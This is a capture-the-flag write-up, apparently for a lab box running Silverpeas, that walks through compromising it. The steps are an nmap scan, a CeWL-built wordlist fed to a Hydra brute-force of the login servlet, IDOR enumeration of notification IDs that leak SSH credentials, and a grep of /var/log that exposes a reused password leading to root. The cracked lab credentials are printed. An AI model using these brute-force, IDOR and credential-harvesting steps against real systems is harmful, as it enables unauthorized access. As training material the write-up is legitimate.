### Description
Think you've got what it takes to outsmart the Hack Smarter Security team? They claim to be unbeatable, and now it's your chance to prove them wrong. Dive into their web server, find the hidden flags, and show the world your elite hacking skills. Good luck, and may the best hacker win!  

But beware, this won't be a walk in the digital park. Hack Smarter Security has fortified the server against common attacks and their password policy requires passwords that have not been breached (they check it against the rockyou.txt wordlist - that's how 'cool' they are). The hacking gauntlet has been thrown, and it's time to elevate your game. Remember, only the most ingenious will rise to the top. 

May your code be swift, your exploits flawless, and victory yours!

### Enumeration 
#### Nmap Scan
```bash
Nmap scan report for <IP>
Host is up (0.020s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c3:25:de:b4:1e:f0:9f:22:e5:f7:9b:36:27:96:93:66 (ECDSA)
|_  256 ff:22:57:2e:99:07:ee:ec:14:90:7d:ac:7c:b4:30:53 (ED25519)
80/tcp   open  http       nginx 1.18.0 (Ubuntu)
|_http-title: Hack Smarter Security
|_http-server-header: nginx/1.18.0 (Ubuntu)
8080/tcp open  http-proxy
|_http-title: Error
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.1 404 Not Found
|     Connection: close
|     Content-Length: 74
|     Content-Type: text/html
|     Date: Mon, 25 Aug 2025 22:23:28 GMT
|     <html><head><title>Error</title></head><body>404 - Not Found</body></html>
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SMBProgNeg, SSLSessionReq, Socks5, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Length: 0
|_    Connection: close
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.95%I=7%D=8/25%Time=68ACE261%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,C9,"HTTP/1\.1\x20404\x20Not\x20Found\r\nConnection:\x20close\r
SF:\nContent-Length:\x2074\r\nContent-Type:\x20text/html\r\nDate:\x20Mon,\
SF:x2025\x20Aug\x202025\x2022:23:28\x20GMT\r\n\r\n<html><head><title>Error
SF:</title></head><body>404\x20-\x20Not\x20Found</body></html>")%r(HTTPOpt
SF:ions,C9,"HTTP/1\.1\x20404\x20Not\x20Found\r\nConnection:\x20close\r\nCo
SF:ntent-Length:\x2074\r\nContent-Type:\x20text/html\r\nDate:\x20Mon,\x202
SF:5\x20Aug\x202025\x2022:23:28\x20GMT\r\n\r\n<html><head><title>Error</ti
SF:tle></head><body>404\x20-\x20Not\x20Found</body></html>")%r(RTSPRequest
SF:,42,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\r\nConn
SF:ection:\x20close\r\n\r\n")%r(FourOhFourRequest,C9,"HTTP/1\.1\x20404\x20
SF:Not\x20Found\r\nConnection:\x20close\r\nContent-Length:\x2074\r\nConten
SF:t-Type:\x20text/html\r\nDate:\x20Mon,\x2025\x20Aug\x202025\x2022:23:28\
SF:x20GMT\r\n\r\n<html><head><title>Error</title></head><body>404\x20-\x20
SF:Not\x20Found</body></html>")%r(Socks5,42,"HTTP/1\.1\x20400\x20Bad\x20Re
SF:quest\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n")%r(Gener
SF:icLines,42,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\
SF:r\nConnection:\x20close\r\n\r\n")%r(Help,42,"HTTP/1\.1\x20400\x20Bad\x2
SF:0Request\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n")%r(SS
SF:LSessionReq,42,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x
SF:200\r\nConnection:\x20close\r\n\r\n")%r(TerminalServerCookie,42,"HTTP/1
SF:\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\r\nConnection:\x20
SF:close\r\n\r\n")%r(TLSSessionReq,42,"HTTP/1\.1\x20400\x20Bad\x20Request\
SF:r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n")%r(Kerberos,42
SF:,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\r\nConnect
SF:ion:\x20close\r\n\r\n")%r(SMBProgNeg,42,"HTTP/1\.1\x20400\x20Bad\x20Req
SF:uest\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n")%r(LPDStr
SF:ing,42,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\r\nC
SF:onnection:\x20close\r\n\r\n")%r(LDAPSearchReq,42,"HTTP/1\.1\x20400\x20B
SF:ad\x20Request\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n");
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   19.58 ms 10.14.0.1
2   19.71 ms <IP>

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Aug 25 18:24:45 2025 -- 1 IP address (1 host up) scanned in 104.07 seconds
```

Visit the website and under the `Contact` tab, there is some info about the username `scr1ptkiddy` and the how to contact the manager `Silverpeas`.
![[contact.png]]

I performed directory enumeration but It didn't give me anything. I didn't know what `silverpeas` was, so I searched for `silverpeas` and found a website where I saw `localhost:8080/silverpeas`. So, I tried that in the browser 
```
http://<IP>:8080/silverpeas
```

### Initial Access
I received back a login page `http://<IP>:8080/silverpeas/defaultLogin.jsp`. 
![[login-page.png]]

In the description, it says that the `Hack Smarter Security Team` have tested their passwords against ***rockyou.txt*** and it could not be breached. So, we can try a different technique and create our own passwords rather then using the dictionary provided in kali.

#### Create a Dictionary of passwords using `Cewl`
```bash
cewl http://<IP> -w passwordlist.txt
```

#### Brute Force the Login Page with Hydra
**Failed attempts**
```bash
hydra -l scr1ptkiddy -P passwordlist.txt <IP> -s 8080 http-form-post '/silverpeas/defaultLogin.jsp:username=scr1ptkiddy&password=^PASS^:F=Login or password incorrect'
```

It didn't work due to some issues:
- Not `defaultLogin.jsp` but `AuthenticationServlet`. Found it under `Network` tab with `POST` method.
- Not `username=scr1ptkiddy&password=^PASS^` instead `Login=scr1ptkiddy&Password=^PASS^&DomainId=0`. Found it using `Burpsuite`.
![[burp.png]]

**Successful attempt**
```bash
hydra -l scr1ptkiddy -P passwordlist <IP> -s 8080 http-form-post '/silverpeas/AuthenticationServlet:Login=scr1ptkiddy&Password=^PASS^&DomainId=0:F=Login or password incorrect' -t 32
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-26 17:36:20
[DATA] max 32 tasks per 1 server, overall 32 tasks, 345 login tries (l:1/p:345), ~11 tries per task
[DATA] attacking http-post-form://<IP>:8080/silverpeas/AuthenticationServlet:Login=scr1ptkiddy&Password=^PASS^&DomainId=0:F=Login or password incorrect
[8080][http-post-form] host: <IP>   login: scr1ptkiddy   password: adipiscing
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-26 17:36:34
```

I logged in using the credentials and landed in `scr1ptkiddy` home page. I started looking around the website and under **Personal workspace** there's **My notifications** tab. There's a notification inside, and when I opened it I was redirected to another link with an `ID=5`.
![[notification.png]]

This reminded of the `Insecure Direct Object Reference (IDOR)` attack. I could not change the ID there, so I copied the link and started changing from 0 and found ssh login details at`ID=6`.
![[ssh_login_creds.png]]

#### First Flag
```bash
ssh tim@<IP>
cat user.txt
```

### Privilege Escalation
I checked the group and found that the user `tim` is a part of `adm` group.
```bash
id

groups
tim adm
```

I searched online for the `adm` group and found out that it is a ***default system group*** and ***can read system logs***, usually in `/var/log.`

#### Read Logs
```bash
grep -ri 'password' /var/log/* 2>/dev/null
/var/log/auth.log:Aug 27 17:42:22 ip-10-10-132-84 sshd[2306]: Accepted password for tim from 10.14.101.2 port 47108 ssh2
/var/log/auth.log.1:Jul 21 20:10:26 ip-10-10-119-245 passwd[654]: password for 'ubuntu' changed by 'root'
/var/log/auth.log.1:Aug 27 17:38:02 ip-10-10-132-84 passwd[644]: password for 'ubuntu' changed by 'root'
/var/log/auth.log.2:Dec 12 19:34:46 silver-platter passwd[1576]: pam_unix(passwd:chauthtok): password changed for tim
/var/log/auth.log.2:Dec 12 19:39:15 silver-platter sudo:    tyler : 3 incorrect password attempts ; TTY=tty1 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/apt install nginx
/var/log/auth.log.2:Dec 13 15:39:07 silver-platter usermod[1597]: change user 'dnsmasq' password
/var/log/auth.log.2:Dec 13 15:39:07 silver-platter chage[1604]: changed password expiry for dnsmasq
/var/log/auth.log.2:Dec 13 15:40:33 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name postgresql -d -e POSTGRES_PASSWORD=_Zd_zx7N823/ -v postgresql-data:/var/lib/postgresql/data postgres:12.3
/var/log/auth.log.2:Dec 13 15:44:30 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name silverpeas -p 8080:8000 -d -e DB_NAME=Silverpeas -e DB_USER=silverpeas -e DB_PASSWORD=_Zd_zx7N823/ -v silverpeas-log:/opt/silverpeas/log -v silverpeas-data:/opt/silvepeas/data --link postgresql:database sivlerpeas:silverpeas-6.3.1
/var/log/auth.log.2:Dec 13 15:45:21 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name silverpeas -p 8080:8000 -d -e DB_NAME=Silverpeas -e DB_USER=silverpeas -e DB_PASSWORD=_Zd_zx7N823/ -v silverpeas-log:/opt/silverpeas/log -v silverpeas-data:/opt/silvepeas/data --link postgresql:database silverpeas:silverpeas-6.3.1
/var/log/auth.log.2:Dec 13 15:45:57 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name silverpeas -p 8080:8000 -d -e DB_NAME=Silverpeas -e DB_USER=silverpeas -e DB_PASSWORD=_Zd_zx7N823/ -v silverpeas-log:/opt/silverpeas/log -v silverpeas-data:/opt/silvepeas/data --link postgresql:database silverpeas:6.3.1
```

We can see the password `_Zd_zx7N823/` and tried this against the `tyler` user.

```bash
su tyler
```

**Checked if the User is in the Sudoers list**
```bash
sudo -l
[sudo] password for tyler: 
Matching Defaults entries for tyler on ip-10-10-132-84:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User tyler may run the following commands on ip-10-10-132-84:
    (ALL : ALL) ALL
```

The user `tyler` is in `sudoers` list and perform all commands as root.

**Checked SUID**
```bash
find / -perm -4000 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/fusermount3
/usr/bin/passwd
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/su
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/umount
/usr/libexec/polkit-agent-helper-1
```

`su` has SUID bit enabled, so we can use this to escalate to root.

```bash
sudo su 
cat root.txt
```
